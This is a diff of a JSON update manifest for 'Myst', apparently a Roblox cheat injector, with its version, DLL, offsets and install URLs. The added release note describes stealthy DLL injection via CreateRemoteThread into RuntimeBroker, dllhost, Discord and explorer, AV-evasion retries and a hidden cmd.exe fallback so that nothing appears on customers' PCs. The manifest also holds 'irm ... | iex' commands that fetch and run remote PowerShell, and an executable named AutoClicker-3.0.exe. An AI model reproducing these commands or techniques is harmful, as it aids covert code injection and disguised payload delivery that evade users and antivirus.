@@ -2,7 +2,7 @@
     "version":  "3.529",
     "script_url":  "https://raw.githubusercontent.com/JustValkz/Myst/main/install.ps1",
     "dll_url":  "https://raw.githubusercontent.com/JustValkz/Myst/main/sbscmp64_mscorwks.dll",
-    "notes":  "Auto build, new sbscmp64_mscorwks.dll",
+    "notes":  "Installer no longer opens a visible 'Myst Host' PowerShell window on any customer PC. Removed the visible-host fallback entirely and widened the invisible injection targets: RuntimeBroker -> dllhost -> Discord (Stable/Canary/PTB/Development) -> explorer -> hidden cmd. If AV blocks CreateRemoteThread into RuntimeBroker on retry 3, the installer silently spawns a hidden cmd.exe (WindowStyle=Hidden, CreateNoWindow=true) as an extra landing spot. Retries bumped 8 -> 10.",
     "offsets_url":  "https://raw.githubusercontent.com/JustValkz/Myst/main/offsets.hpp",
     "offsets_json_url":  "https://raw.githubusercontent.com/JustValkz/Myst/main/offsets.json",
     "roblox_version":  "version-d584fb6c717a43d9",
@@ -12,9 +12,10 @@
     "fflags_json_url":  "https://raw.githubusercontent.com/JustValkz/Myst/main/fflags.json",
     "fflags_source":  "valkz-fflag-dumper",
     "fflags_count":  14147,
-    "published_commit":  "81b125dc8cfe",
     "private_install":  "irm https://raw.githubusercontent.com/JustValkz/Myst/main/install.ps1 | iex",
     "public_install":  "irm https://raw.githubusercontent.com/JustValkz/Myst/main/install-public.ps1 | iex",
     "public_script_url":  "https://raw.githubusercontent.com/JustValkz/Myst/main/install-public.ps1",
-    "public_exe_url":  "https://raw.githubusercontent.com/JustValkz/Myst/main/AutoClicker-3.0.exe"
+    "public_exe_url":  "https://raw.githubusercontent.com/JustValkz/Myst/main/AutoClicker-3.0.exe",
+    "published_commit":  "ea3107c4d593"
 }
+
